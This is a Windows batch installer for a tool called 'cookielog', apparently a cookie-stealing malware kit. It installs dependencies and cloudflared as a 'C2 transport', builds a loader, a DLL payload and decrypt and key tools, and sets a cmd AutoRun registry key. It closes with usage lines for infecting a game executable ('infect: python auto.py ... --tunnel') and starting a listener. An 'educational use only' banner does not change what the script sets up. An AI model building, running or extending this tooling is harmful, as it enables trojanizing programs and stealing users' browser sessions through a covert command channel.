@echo off
REM ==============================================================================
REM install.bat -- cookielog installer (Windows: attacker box and build box)
REM EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
REM
REM Installs everything needed to run cookielog on Windows:
REM   1. Python 3.8+ (winget if missing) and a working `python`
REM   2. pip packages from requirements.txt (cryptography, websocket-client)
REM   3. Toolchain: MSVC Build Tools 2022 C++ workload or clang-cl
REM   4. CLI tools: Clink, fzf, bat, ripgrep -- via winget
REM   5. cmd_init.cmd (Linux-style aliases) in %USERPROFILE%\bin + AutoRun
REM   6. cloudflared (the --tunnel C2 transport)
REM   7. Build payload + verify + unit tests
REM
REM Usage:
REM   install.bat               :: install and verify everything
REM   install.bat --no-build    :: skip the MSVC install and the build step
REM   install.bat --no-tools    :: skip CLI tools (fzf, bat, ripgrep, clink)
REM   install.bat --no-tunnel   :: skip cloudflared
REM   install.bat --check       :: report only, install nothing, exit 1 if broken
REM
REM Run from the cookielog directory.
REM ==============================================================================
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo ==============================================================================
echo   cookielog -- installer (Windows)
echo   EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
echo ==============================================================================
echo.

set "DO_BUILD=1"
set "DO_TOOLS=1"
set "DO_TUNNEL=1"
set "CHECK_ONLY=0"
set "FAIL=0"

:parse
if "%1"=="" goto start
if /i "%1"=="--no-build" set "DO_BUILD=0"
if /i "%1"=="--no-tools" set "DO_TOOLS=0"
if /i "%1"=="--no-tunnel" set "DO_TUNNEL=0"
if /i "%1"=="--check" (
    set "CHECK_ONLY=1"
    set "DO_BUILD=0"
    set "DO_TOOLS=0"
)
shift
if not "%1"=="" goto parse

:start
REM ------------------------------------------------------------------ 1. python
echo [1/7] python
echo ==============================================================================
where /q python 2>nul
if errorlevel 1 goto no_python
REM A bare `python` may be the Microsoft Store alias: it resolves, then exits
REM 9009 on first use. Import something to prove the interpreter is real.
python -c "import sys" >nul 2>&1
if errorlevel 1 goto no_python
for /f "delims=" %%v in ('python -c "import sys;print(sys.version.split()[0])"') do set "PYVER=%%v"
echo [+] python !PYVER!
goto step2

:no_python
echo [-] python not found in PATH
if "%CHECK_ONLY%"=="1" (
    set "FAIL=1"
    goto step2
)
where /q winget 2>nul
if errorlevel 1 (
    echo     winget is missing too. Install Python 3.8+ from https://python.org
    exit /b 1
)
echo [*] installing Python 3.14 via winget...
winget install --id Python.Python.3.14 -e --silent --accept-source-agreements --accept-package-agreements
if errorlevel 1 (
    echo [-] winget could not install Python. Install it from https://python.org
    exit /b 1
)
echo [+] Python installed. Open a NEW terminal and re-run install.bat.
exit /b 0

REM ------------------------------------------------------------ 2. pip packages
:step2
echo.
echo [2/7] pip packages
echo ==============================================================================
if "%CHECK_ONLY%"=="1" (
    python -c "import cryptography, websocket" >nul 2>&1
    if errorlevel 1 (echo   [-] cryptography / websocket-client: not installed & set "FAIL=1") else (echo   [+] cryptography, websocket-client)
    goto step3
)
python -m pip install --disable-pip-version-check -r requirements.txt
if errorlevel 1 (
    echo [-] pip install failed. Try: python -m pip install -r requirements.txt
    set "FAIL=1"
) else (
    echo [+] pip packages installed
)

REM --------------------------------------------------------------- 3. toolchain
:step3
echo.
echo [3/7] C/C++ toolchain
echo ==============================================================================
call :find_vcvars
if defined VCVARS goto toolchain_ok
where /q clang-cl 2>nul
if not errorlevel 1 (
    echo [+] clang-cl: found in PATH
    goto step4
)
set "HAVE_CLANG="
for /d %%D in ("%USERPROFILE%\toolchain\*") do (
    if exist "%%~D\bin\clang-cl.exe" set "HAVE_CLANG=1"
)
if defined HAVE_CLANG (
    echo [+] clang-cl: found under %USERPROFILE%\toolchain
    goto step4
)
echo [-] no MSVC BuildTools and no clang-cl
if "%CHECK_ONLY%"=="1" (
    set "FAIL=1"
    goto step4
)
if "%DO_BUILD%"=="0" (
    echo [*] skipping the MSVC install ^(--no-build^)
    goto step4
)
where /q winget 2>nul
if errorlevel 1 (
    echo     winget is missing. Install Build Tools from:
    echo     https://visualstudio.microsoft.com/visual-cpp-build-tools/
    echo     Select "Desktop development with C++".
    set "FAIL=1"
    goto step4
)
echo [*] installing MSVC Build Tools 2022 (C++ workload, ~2 GB)...
winget install Microsoft.VisualStudio.2022.BuildTools --accept-source-agreements --accept-package-agreements --override "--quiet --wait --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"
if errorlevel 1 (
    echo [-] MSVC install failed or was cancelled. The Python side still works;
    echo     you need MSVC or clang-cl only to compile the payload.
    set "FAIL=1"
    goto step4
)
call :find_vcvars
if defined VCVARS (echo [+] MSVC Build Tools installed) else (echo [-] Build Tools installed but vcvars64.bat not found & set "FAIL=1")
goto step4

:toolchain_ok
echo [+] MSVC: !VCVARS!

REM ----------------------------------------------------------------- 4. cli tools
:step4
echo.
echo [4/7] CLI tools (Clink, fzf, bat, ripgrep)
echo ==============================================================================
if "%CHECK_ONLY%"=="1" goto check_tools
if "%DO_TOOLS%"=="0" (
    echo [*] skipping CLI tools ^(--no-tools^)
    goto step5
)
call :want_tool clink chrisant996.Clink
call :want_tool fzf junegunn.fzf
call :want_tool bat sharkdp.bat
call :want_tool rg BurntSushi.ripgrep.GNU
goto step5

:check_tools
for %%t in (clink fzf bat rg) do (
    where /q %%t 2>nul
    if errorlevel 1 (echo   [-] %%t: not found) else (echo   [+] %%t: found)
)
goto step5

REM -------------------------------------------------------------- 5. cmd aliases
:step5
echo.
echo [5/7] cmd_init.cmd (Linux-style aliases)
echo ==============================================================================
set "CMDINIT_DST=%USERPROFILE%\bin\cmd_init.cmd"
if "%CHECK_ONLY%"=="1" (
    if exist "!CMDINIT_DST!" (echo   [+] cmd_init.cmd: installed) else (echo   [-] cmd_init.cmd: not installed)
    goto step6
)
if not exist "%USERPROFILE%\bin" mkdir "%USERPROFILE%\bin"
copy /y "cmd_init.cmd" "!CMDINIT_DST!" >nul 2>&1
if errorlevel 1 (
    echo [-] failed to copy cmd_init.cmd
    set "FAIL=1"
) else (
    echo [+] cmd_init.cmd copied to !CMDINIT_DST!
)
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "call \"%USERPROFILE%\bin\cmd_init.cmd\"" /f >nul 2>&1
if errorlevel 1 (
    echo [-] failed to set the AutoRun registry key
    set "FAIL=1"
) else (
    echo [+] AutoRun registry key set
)

REM ---------------------------------------------------------------- 6. cloudflared
:step6
echo.
echo [6/7] cloudflared (the --tunnel C2 transport)
echo ==============================================================================
set "CF_DIR=%LOCALAPPDATA%\cloudflared"
set "CF_EXE=%CF_DIR%\cloudflared.exe"
if exist "%CF_EXE%" (
    echo [+] cloudflared: %CF_EXE%
    goto step7
)
if "%CHECK_ONLY%"=="1" (
    echo   [-] cloudflared: not found
    echo       without it, --tunnel cannot start; every other C2 mode still works
    goto step7
)
if "%DO_TUNNEL%"=="0" (
    echo [*] skipping cloudflared ^(--no-tunnel^)
    goto step7
)
echo [*] downloading cloudflared (about 55 MB)...
if not exist "%CF_DIR%" mkdir "%CF_DIR%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -UseBasicParsing -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '%CF_EXE%'; exit 0 } catch { exit 1 }"
if errorlevel 1 (
    echo [-] cloudflared download failed
    echo     download it manually and set CLOUDFLARED=/path/to/cloudflared.exe
    set "FAIL=1"
    goto step7
)
"%CF_EXE%" --version
if errorlevel 1 (
    echo [-] cloudflared downloaded but does not run on this machine
    set "FAIL=1"
) else (
    echo [+] cloudflared installed: %CF_EXE%
)

REM -------------------------------------------------------- 7. build -- verify
:step7
echo.
echo [7/7] build, verify, tests
echo ==============================================================================
if "%CHECK_ONLY%"=="1" (
    python build.py check
    if errorlevel 1 set "FAIL=1"
    goto summary
)
if "%DO_BUILD%"=="0" (
    echo [*] skipping the build ^(--no-build^)
    goto summary
)
set "HAVE_BINS=1"
if not exist "bin\loader.exe" set "HAVE_BINS=0"
if not exist "bin\ckdll.dll" set "HAVE_BINS=0"
if not exist "bin\ckdec.exe" set "HAVE_BINS=0"
if not exist "bin\ckkey.exe" set "HAVE_BINS=0"
if "%HAVE_BINS%"=="1" (
    echo [+] binaries already compiled
) else (
    echo [*] building payload + keytool...
    python build.py all
    if errorlevel 1 (
        echo [-] build failed
        set "FAIL=1"
    )
)
echo [*] verifying artifacts and patched slots...
python build.py verify
if errorlevel 1 set "FAIL=1"
echo [*] running the unit tests...
python build.py test
if errorlevel 1 set "FAIL=1"

REM ------------------------------------------------------------------- summary
:summary
echo.
echo ==============================================================================
echo   summary
echo ==============================================================================
where /q python 2>nul
if errorlevel 1 (echo   python:       MISSING) else (echo   python:       ok)
python -c "import cryptography, websocket" >nul 2>&1
if errorlevel 1 (echo   pip packages: MISSING) else (echo   pip packages: ok)
call :find_vcvars
if defined VCVARS (echo   MSVC:         !VCVARS!) else (echo   MSVC:         not found)
where /q clang-cl 2>nul
if errorlevel 1 (echo   clang-cl:     not in PATH) else (echo   clang-cl:     ok)
if exist "bin\loader.exe" (echo   loader.exe:   ok) else (echo   loader.exe:   MISSING)
if exist "bin\ckdll.dll" (echo   ckdll.dll:    ok) else (echo   ckdll.dll:    MISSING)
if exist "bin\ckdec.exe" (echo   ckdec.exe:    ok) else (echo   ckdec.exe:    MISSING)
if exist "bin\ckkey.exe" (echo   ckkey.exe:    ok) else (echo   ckkey.exe:    MISSING)
if exist "%CF_EXE%" (echo   cloudflared:  ok) else (echo   cloudflared:  MISSING)
if exist "!CMDINIT_DST!" (echo   cmd_init:     ok) else (echo   cmd_init:     not installed)
echo.
if "!FAIL!"=="1" (
    echo [x] some checks failed -- see the messages above.
    echo.
    if "%CHECK_ONLY%"=="1" exit /b 1
    exit /b 1
)
echo [+] ready
echo.
echo   infect:      python auto.py "C:\path\game.exe" --tunnel
echo   local test:  python auto.py "C:\path\game.exe" --tunnel --run
echo   listener:    python listen.py 9090
echo   manual key:  bin\ckkey.exe /quiet
echo.
if "%CHECK_ONLY%"=="1" echo Done (check only -- nothing was installed).
if not "%CHECK_ONLY%"=="1" (
    echo %cmdcmdline% | find /i "%~nx0" >nul && pause
)
exit /b 0

REM ==============================================================================
REM helpers
REM ==============================================================================
:find_vcvars
set "VCVARS="
for %%R in (
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\BuildTools"
    "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Community"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Professional"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Professional"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Enterprise"
) do (
    if exist "%%~R\VC\Auxiliary\Build\vcvars64.bat" set "VCVARS=%%~R\VC\Auxiliary\Build\vcvars64.bat"
)
exit /b 0

:want_tool
where /q %1 2>nul
if not errorlevel 1 (
    echo [+] %1 already installed
    exit /b 0
)
echo [*] installing %1...
winget install %2 --accept-source-agreements --accept-package-agreements
if errorlevel 1 (echo [-] %1 install failed) else (echo [+] %1 installed)
exit /b 0
